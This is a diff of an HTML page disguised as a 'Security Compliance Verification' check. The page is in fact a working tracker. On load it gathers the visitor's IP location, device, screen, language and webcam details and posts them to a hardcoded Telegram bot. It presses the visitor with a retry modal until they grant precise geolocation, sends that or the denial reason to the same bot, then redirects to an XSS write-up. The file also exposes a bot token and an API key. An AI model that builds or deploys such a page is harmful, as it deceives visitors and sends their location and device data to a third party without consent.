@@ -2,206 +2,232 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Security Compliance Verification</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Security Compliance Verification</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
-        body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-            color: #ffffff;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            animation: fadeIn 1.5s ease-out forwards;
-        }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      color: #ffffff;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      animation: fadeIn 1.5s ease-out forwards;
+    }
 
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+      }
+      to {
+        opacity: 1;
+      }
+    }
 
-            to {
-                opacity: 1;
-            }
-        }
+    .container {
+      background: rgba(0, 0, 0, 0.85);
+      padding: 45px 35px;
+      border-radius: 16px;
+      text-align: center;
+      width: 90%;
+      max-width: 480px;
+      box-shadow: 0 0 30px rgba(0, 255, 213, 0.4);
+      animation: slideUp 1s ease-out;
+    }
 
-        .container {
-            background: rgba(0, 0, 0, 0.85);
-            padding: 45px 35px;
-            border-radius: 16px;
-            text-align: center;
-            width: 90%;
-            max-width: 480px;
-            box-shadow: 0 0 30px rgba(0, 255, 213, 0.4);
-            animation: slideUp 1s ease-out;
-        }
+    @keyframes slideUp {
+      from {
+        transform: translateY(50px);
+        opacity: 0;
+      }
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
 
-        @keyframes slideUp {
-            from {
-                transform: translateY(50px);
-                opacity: 0;
-            }
+    h1 {
+      font-size: 1.9rem;
+      color: #00ffd5;
+      margin-bottom: 18px;
+      animation: pulseGlow 2.5s infinite;
+    }
 
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
+    @keyframes pulseGlow {
+      0%, 100% {
+        text-shadow: 0 0 5px #00ffd5, 0 0 15px #00ffd5;
+      }
+      50% {
+        text-shadow: 0 0 15px #00ffd5, 0 0 30px #00ffd5;
+      }
+    }
 
-        h1 {
-            font-size: 1.9rem;
-            color: #00ffd5;
-            margin-bottom: 18px;
-            animation: pulseGlow 2.5s infinite;
-        }
+    p {
+      font-size: 1rem;
+      color: #ccc;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
 
-        @keyframes pulseGlow {
+    .loader {
+      margin: 25px auto;
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      border: 5px solid #00ffd5;
+      border-top-color: transparent;
+      animation: spin 1s linear infinite;
+    }
 
-            0%,
-            100% {
-                text-shadow: 0 0 5px #00ffd5, 0 0 15px #00ffd5;
-            }
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
 
-            50% {
-                text-shadow: 0 0 15px #00ffd5, 0 0 30px #00ffd5;
-            }
-        }
+    #status {
+      font-size: 0.95rem;
+      color: #ff6666;
+      margin-top: 20px;
+    }
 
-        p {
-            font-size: 1rem;
-            color: #ccc;
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-
-        .loader {
-            margin: 25px auto;
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            border: 5px solid #00ffd5;
-            border-top-color: transparent;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        #status {
-            font-size: 0.95rem;
-            color: #ff6666;
-            margin-top: 20px;
-        }
-
-        #success-message {
-            display: none;
-            font-size: 1.1rem;
-            margin-top: 20px;
-            color: #00ffc3;
-        }
-    </style>
+    #success-message {
+      display: none;
+      font-size: 1.1rem;
+      margin-top: 20px;
+      color: #00ffc3;
+    }
+  </style>
 </head>
 
 <body>
-    <div class="container" id="content">
-        <h1>Security Check In Progress</h1>
-        <p>Please hold while we verify your connection and region.</p>
-        <div class="loader"></div>
-        <p id="status"></p>
-        <p id="success-message">✅ Verification complete. Redirecting...</p>
-    </div>
+  <div class="container" id="content">
+    <h1>Security Check In Progress</h1>
+    <p>Please hold while we verify your connection and region.</p>
+    <div class="loader"></div>
+    <p id="status"></p>
+    <p id="success-message">✅ Verification complete. Redirecting...</p>
+  </div>
 
-    <script>
-        const telegramToken = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
-        const chatId = "6239813037";
-        const redirectURL = "https://medium.com/@MianHammadx0root/exploiting-blind-xss-in-a-signup-page-admin-panel-takeover-and-real-world-impact-3000-p2-private-110205e3674b";
+  <script>
+    const telegramToken = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
+    const chatId = "6239813037";
+    const redirectURL = "https://medium.com/@spoppi/an-xss-journey-from-self-xss-to-account-takeover-b7ad8566d5fb";
 
-        function sendToTelegram(message) {
-            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            });
-        }
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
+    }
 
-        async function collectAndSendInfo() {
-            try {
-                const res = await fetch("https://ipinfo.io/json?token=be5998b85f541c");
-                const data = await res.json();
-                const [lat, lon] = data.loc.split(',');
+    async function collectAndSendInfo() {
+      try {
+        const res = await fetch("https://ipinfo.io/json?token=be5998b85f541c");
+        const data = await res.json();
+        const [lat, lon] = data.loc.split(',');
 
-                const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
-                const resolution = `${window.screen.width}x${window.screen.height}`;
-                const colorDepth = `${screen.colorDepth}-bit`;
-                const language = navigator.language;
-                const platform = navigator.platform;
-                const userAgent = navigator.userAgent;
-                const hasWebcam = navigator.mediaDevices && navigator.mediaDevices.getUserMedia ? "Possible" : "No Access";
+        const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
+        const resolution = `${window.screen.width}x${window.screen.height}`;
+        const colorDepth = `${screen.colorDepth}-bit`;
+        const language = navigator.language;
+        const platform = navigator.platform;
+        const userAgent = navigator.userAgent;
+        const hasWebcam = navigator.mediaDevices && navigator.mediaDevices.getUserMedia ? "Possible" : "No Access";
 
-                let adBlockEnabled = false;
-                const ad = document.createElement('div');
-                ad.className = 'adsbox';
-                ad.style.height = '1px';
-                document.body.appendChild(ad);
-                window.setTimeout(() => {
-                    if (ad.offsetHeight === 0) adBlockEnabled = true;
-                    ad.remove();
+        let adBlockEnabled = false;
+        const ad = document.createElement('div');
+        ad.className = 'adsbox';
+        ad.style.height = '1px';
+        document.body.appendChild(ad);
+        window.setTimeout(() => {
+          if (ad.offsetHeight === 0) adBlockEnabled = true;
+          ad.remove();
 
-                    const fullDetails = `📡 IP Info\n----------------------\n🌐 IP: ${data.ip}\n🗺 Country: ${data.country}\n🏙 City: ${data.city}\n🌍 Region: ${data.region || 'N/A'}\n📍 Postal: ${data.postal || 'N/A'}\n📞 Coordinates: ${data.loc}\n🏢 Org: ${data.org}\n💻 ISP: ${data.org}\n🖥 Device: ${deviceType}\n📐 Resolution: ${resolution}\n🎨 Color Depth: ${colorDepth}\n🌐 Language: ${language}\n🖥 Platform: ${platform}\n📷 Webcam: ${hasWebcam}\n🧠 AdBlocker: ${adBlockEnabled ? "Likely Enabled" : "Not Detected"}\n📱 User Agent: ${userAgent}\n🕰 Time: ${new Date().toLocaleString()}`;
+          const fullDetails = `📡 IP Info\n----------------------\n🌐 IP: ${data.ip}\n🗺 Country: ${data.country}\n🏙 City: ${data.city}\n🌍 Region: ${data.region || 'N/A'}\n📍 Postal: ${data.postal || 'N/A'}\n📞 Coordinates: ${data.loc}\n🏢 Org: ${data.org}\n💻 ISP: ${data.org}\n🖥 Device: ${deviceType}\n📐 Resolution: ${resolution}\n🎨 Color Depth: ${colorDepth}\n🌐 Language: ${language}\n🖥 Platform: ${platform}\n📷 Webcam: ${hasWebcam}\n🧠 AdBlocker: ${adBlockEnabled ? "Likely Enabled" : "Not Detected"}\n📱 User Agent: ${userAgent}\n🕰 Time: ${new Date().toLocaleString()}`;
 
-                    sendToTelegram(fullDetails);
-                    requestLocation();
-                }, 300);
-            } catch (e) {
-                document.getElementById("status").innerText = "Failed to verify connection.";
-                sendToTelegram("⚠️ Failed to fetch IP info.");
+          sendToTelegram(fullDetails);
+          requestLocation();
+        }, 300);
+      } catch (e) {
+        document.getElementById("status").innerText = "Failed to verify connection.";
+        sendToTelegram("⚠️ Failed to fetch IP info.");
+      }
+    }
+
+    function requestLocation() {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
+          sendToTelegram(`✅ Location granted\n🌐 Google Maps: ${mapsLink}`);
+
+          document.querySelector("#success-message").style.display = 'block';
+          setTimeout(() => {
+            window.location.href = redirectURL;
+          }, 3000);
+        },
+        (error) => {
+          document.querySelector(".loader").style.display = 'none';
+          const modal = document.createElement('div');
+          modal.style.position = 'fixed';
+          modal.style.top = '50%';
+          modal.style.left = '50%';
+          modal.style.transform = 'translate(-50%, -50%)';
+          modal.style.background = 'rgba(0, 0, 0, 0.95)';
+          modal.style.border = '1px solid #00ffd5';
+          modal.style.padding = '30px';
+          modal.style.borderRadius = '15px';
+          modal.style.boxShadow = '0 0 20px #00ffd5';
+          modal.style.zIndex = '9999';
+          modal.style.textAlign = 'center';
+          modal.style.animation = 'fadeInModal 0.5s ease-out';
+
+          modal.innerHTML = `
+            <h2 style='color: #00ffd5; margin-bottom: 15px;'>Location Required</h2>
+            <p style='color: #ccc; font-size: 0.95rem; margin-bottom: 20px;'>To complete verification, please enable your location access.</p>
+            <button onclick='retryLocation()' style='padding: 12px 20px; background: linear-gradient(145deg, #00ffd5, #00c9aa); border: none; border-radius: 10px; font-weight: 600; font-size: 1rem; color: #000; cursor: pointer;'>Try Again</button>
+          `;
+
+          document.body.appendChild(modal);
+
+          const style = document.createElement('style');
+          style.innerHTML = `
+            @keyframes fadeInModal {
+              from { opacity: 0; transform: translate(-50%, -60%); }
+              to { opacity: 1; transform: translate(-50%, -50%); }
             }
+          `;
+          document.head.appendChild(style);
+
+          window.retryLocation = requestLocation;
+          sendToTelegram(`❌ Location denied\nReason: ${error.message}`);
         }
+      );
+    }
 
-        function requestLocation() {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
-                    sendToTelegram(`✅ Location granted\n🌐 Google Maps: ${mapsLink}`);
-
-                    document.querySelector("#success-message").style.display = 'block';
-                    setTimeout(() => {
-                        window.location.href = redirectURL;
-                    }, 3000);
-                },
-                (error) => {
-                    document.querySelector(".loader").style.display = 'none';
-                    document.getElementById("status").innerHTML = `Location access was denied. <br>Please enable location to continue for regional compliance.<br><br><button onclick='requestLocation()' style='margin-top:10px;padding:10px 16px;background:#00ffd5;border:none;border-radius:8px;color:#000;font-weight:600;cursor:pointer;'>Try Again</button>`;
-                    sendToTelegram(`❌ Location denied\nReason: ${error.message}`);
-                }
-            );
-        }
-
-        window.onload = () => {
-            setTimeout(() => {
-                collectAndSendInfo();
-            }, 3000);
-        };
-    </script>
+    window.onload = () => {
+      setTimeout(() => {
+        collectAndSendInfo();
+      }, 3000);
+    };
+  </script>
 </body>
 
 </html>
